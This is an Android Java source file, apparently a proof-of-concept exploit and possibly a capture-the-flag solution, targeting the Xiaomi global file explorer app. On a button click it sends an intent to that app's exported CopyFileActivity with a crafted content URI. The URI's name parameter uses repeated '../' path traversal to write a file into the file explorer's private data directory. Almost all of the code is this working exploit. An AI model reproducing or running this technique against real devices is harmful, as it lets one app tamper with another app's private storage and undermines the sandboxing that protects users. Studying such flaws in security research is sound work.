package com.example.victim;

import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "victimAppMainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        Button btn = findViewById(R.id.button);

        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent();
                intent.setAction(Intent.ACTION_SEND);
                intent.setComponent(new ComponentName("com.mi.android.globalFileexplorer", "com.android.fileexplorer.activity.CopyFileActivity"));

                intent.setData(Uri.parse("content://evil_provider/files/test.txt?path=" + getFilesDir()
                        + "/test.txt" + "&name=../../../../../../../../data/user/0/com.mi.android.globalFileexplorer/files/test.txt"
                        + "&size=10"));
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                startActivity(intent);
            }
        });

//        File filesDir = getFilesDir();
//
//        File flagFile = new File(filesDir, "flag");
//
//        try (FileOutputStream fos = new FileOutputStream(flagFile)) {
//            String content = "flag{test_______flag}";
//            fos.write(content.getBytes());
//            Log.d(TAG, "文件写入成功，路径：" + flagFile.getAbsolutePath());
//        } catch (IOException e) {
//            Log.e(TAG, "文件写入失败", e);
//            e.printStackTrace();
//        }

    }
}